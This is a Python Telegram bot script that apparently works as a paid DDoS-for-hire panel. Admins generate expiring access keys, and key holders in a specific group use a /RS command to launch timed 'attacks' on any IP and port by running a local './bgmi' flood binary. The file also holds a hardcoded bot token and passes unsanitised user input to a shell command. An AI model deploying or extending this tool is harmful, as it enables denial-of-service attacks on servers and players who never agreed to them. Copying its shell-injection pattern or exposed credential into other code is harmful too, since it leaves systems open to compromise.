#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading
import random
import string
from telebot import types

# TELEGRAM BOT TOKEN
bot = telebot.TeleBot('7973805250:AAHbHYf3aYKsONcH-TDsmJljEZjpLCLSixM')

# GROUP AND CHANNEL DETAILS
GROUP_ID = "-1002252633433"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
ADMINS = [7129010361]

# GLOBAL VARIABLES
is_attack_running = False
attack_end_time = None
pending_feedback = {}
warn_count = {}
attack_logs = []
user_attack_count = {}
keys = {}  # Store generated keys with expiry dates
user_keys = {}  # Store users who redeemed keys

# FUNCTION TO CHECK IF USER IS IN CHANNEL
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# FUNCTION TO GENERATE RANDOM KEYS
def generate_key(length=10):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

# /GENKEY COMMAND (ADMIN ONLY)
@bot.message_handler(commands=['genkey'])
def generate_access_key(message):
    if message.from_user.id not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ USAGE: /genkey <DAYS>")
        return

    try:
        days = int(command[1])
    except ValueError:
        bot.reply_to(message, "❌ DAYS MUST BE A NUMBER!")
        return

    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    new_key = generate_key()
    keys[new_key] = expiry_date

    bot.reply_to(message, f"✅ NEW KEY GENERATED:\n🔑 `{new_key}`\n📅 Expiry: {expiry_date.strftime('%Y-%m-%d')}", parse_mode="Markdown")

# /REDEEM COMMAND
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ USAGE: /redeem <KEY>")
        return

    user_id = message.from_user.id
    key = command[1]

    if key not in keys:
        bot.reply_to(message, "❌ INVALID KEY!")
        return

    if datetime.datetime.now() > keys[key]:
        bot.reply_to(message, "⏳ THIS KEY HAS EXPIRED!")
        del keys[key]
        return

    user_keys[user_id] = keys[key]
    del keys[key]

    bot.reply_to(message, f"🎉 SUCCESSFULLY REDEEMED!\n📅 Valid till: {user_keys[user_id].strftime('%Y-%m-%d')}", parse_mode="Markdown")

# HANDLE ATTACK COMMAND (ONLY IF USER HAS REDEEMED A KEY)
@bot.message_handler(commands=['RS'])
def handle_attack(message):
    global is_attack_running, attack_end_time
    user_id = message.from_user.id
    command = message.text.split()

    if user_id not in user_keys:
        bot.reply_to(message, "❌ PEHLE /redeem KARKAY ACCESS LO!")
        return

    if datetime.datetime.now() > user_keys[user_id]:
        bot.reply_to(message, "⏳ TERA ACCESS EXPIRE HO CHUKA HAI! ADMIN SE BAAT KAR.")
        return

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 YE BOT SIRF GROUP ME CHALEGA! ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ PEHLE CHANNEL JOIN KAR! {CHANNEL_USERNAME}")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "PEHLE SCREENSHOT BHEJ, WARNA NAYA ATTACK NAHI MILEGA! 😡")
        return

    if is_attack_running:
        bot.reply_to(message, "⚠️ EK ATTACK ALREADY CHAL RAHA HAI! CHECK KAR SAKTE HO /check !")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ USAGE: /RS <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ PORT AUR TIME NUMBER HONE CHAHIYE!")
        return

    if time_duration > 500:
        bot.reply_to(message, "🚫 700S SE ZYADA ALLOWED NAHI HAI!")
        return

    confirm_msg = f"🔥 ATTACK DETAILS:\n🎯 TARGET: `{target}`\n🔢 PORT: `{port}`\n⏳ DURATION: `{time_duration}S`\nSTATUS: `CHAL RAHA HAI...`\n📸 ATTACK KE BAAD SCREENSHOT BHEJNA ZAROORI HAI!"

    bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")

    is_attack_running = True
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)
    pending_feedback[user_id] = True  

    try:
        subprocess.run(f"./bgmi {target} {port} {time_duration} 100", shell=True, check=True, timeout=time_duration)
    except subprocess.TimeoutExpired:
        bot.reply_to(message, "❌ ATTACK TIMEOUT HO GAYA! 🚨")
    except subprocess.CalledProcessError:
        bot.reply_to(message, "❌ ATTACK FAIL HO GAYA!")
    finally:
        is_attack_running = False
        attack_end_time = None  
        bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 🎯\n📸 AB SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI MILEGA!")

# START POLLING
bot.polling(none_stop=True)